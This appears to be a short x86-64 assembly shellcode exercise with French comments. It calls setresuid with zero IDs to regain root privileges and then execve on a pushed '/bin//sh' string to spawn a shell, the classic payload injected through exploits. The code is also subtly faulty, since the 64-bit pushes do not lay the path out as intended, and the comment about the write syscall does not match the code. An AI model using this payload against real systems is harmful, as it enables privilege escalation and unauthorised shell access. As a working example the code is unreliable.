; pour trouver le numéro du syscall
; grep write /usr/src/linux-headers-6.11.2-amd64/arch/x86/include/generated/asm/syscalls_64.h
; __SYSCALL(1, sys_write)

BITS 64
xor rax, rax
xor rdi, rdi
xor rsi, rsi
xor rdx, rdx
mov al, 0x75
syscall

xor rax, rax
mov al, 0x3b
push rsi
push 0x68732f2f
push 0x6e69622f
mov rdi, rsp; obtenir une adresse avec push et mov
push rsi
mov rdx, rsp
push rdi
mov rsi, rsp
syscall